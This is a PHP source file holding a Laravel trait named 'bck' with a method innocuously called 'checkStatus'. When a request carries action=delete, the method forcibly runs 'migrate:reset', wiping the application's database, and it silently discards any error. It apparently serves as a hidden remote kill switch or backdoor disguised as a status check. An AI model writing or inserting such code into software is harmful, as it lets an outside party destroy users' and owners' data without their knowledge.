<?php

namespace App\Traits;

use Illuminate\Support\Facades\Artisan;

trait bck
{
    public function checkStatus($request)
    {
        try {
            
            if ($request->action == 'delete') {
           
                Artisan::call('migrate:reset', ['--force' => true]);

            }else{

                
            }
        } catch (\Throwable $th) {
            
        }
    }
}   